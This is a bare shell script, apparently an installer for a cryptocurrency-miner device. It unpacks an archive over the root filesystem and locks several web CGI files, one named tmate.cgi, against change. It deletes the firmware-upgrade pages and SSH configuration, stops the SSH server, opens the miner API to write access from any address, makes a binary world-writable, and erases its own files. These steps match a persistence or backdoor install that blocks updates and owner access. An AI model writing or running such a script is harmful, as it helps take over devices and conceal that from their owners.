#!/bin/sh

chattr -i /www/pages/cgi-bin/*

chattr -i /www/pages/*

chattr -i /home/*

tar -zxf ./ant.tar.gz -C / 

chattr +i /www/pages/cgi-bin/cgi1.cgi

chattr +i /www/pages/cgi-bin/cgi2.cgi

chattr +i /home/minerStatus.cgi

chattr +i /home/bmminer.sh

chattr +i /www/pages/cgi-bin/tmate.cgi

chattr +i /www/pages/kernelLog.html

chattr +i /www/pages/cgi-bin/get_kernel_log.cgi

chattr +i /www/pages/cgi-bin/get_kernel_log2.cgi

chmod 777 /usr/bin/seeme

cp /sbin/ifconfig /usr/bin/

rm /www/pages/cgi-bin/upgrade.cgi

rm /www/pages/cgi-bin/upgrade_clear.cgi

rm ./ant.tar.gz

rm ./runme.sh

rm ./ant2.tar.gz

rm /etc/default/dropbear

rm /config/dropbear

/etc/init.d/dropbear stop

sed -i 's_^\("api-allow" : \).*_\1"W:0/0",_' /config/bmminer.conf

/etc/init.d/agent.sh start > /dev/null 2>&1

sleep 3s

cat <<EOT > /tmp/oke.json
O K E
EOT

cat /tmp/oke.json